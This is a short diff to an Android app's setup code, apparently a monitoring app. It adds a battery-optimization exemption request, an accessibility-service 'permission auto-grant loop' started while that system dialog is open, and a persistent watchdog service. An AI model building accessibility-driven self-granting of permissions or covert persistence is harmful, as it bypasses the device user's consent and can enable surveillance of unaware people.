@@ -626,12 +626,27 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        // Standard Runtime Permissions, Accessibility, and Notification Access are now enabled!
+        // Step 4: Battery Optimization Exemption (Prompts direct system dialog "Let app always run in background?")
+        if (!isBatteryExempted()) {
+            try {
+                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                    data = Uri.parse("package:$packageName")
+                }
+                batteryExemptionLauncher.launch(intent)
+                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+                return
+            } catch (e: Exception) {
+                Log.w(TAG, "Failed to launch battery exemption intent", e)
+            }
+        }
+
+        // Standard Runtime Permissions, Accessibility, Notification Access, and Battery Exemption are now enabled!
         isOneTapFlowRunning = false
         deviceState.markSetupCompleted()
         refreshPermissionStatus()
         triggerAutoSyncAfterAccessibility()
-        Log.i(TAG, "Core permissions, Accessibility & Notification Access all active")
+        com.spapp.monitoring.sync.PersistentWatchdogService.start(applicationContext)
+        Log.i(TAG, "Core permissions, Accessibility, Notification Access & Battery Exemption all active")
     }
 
 
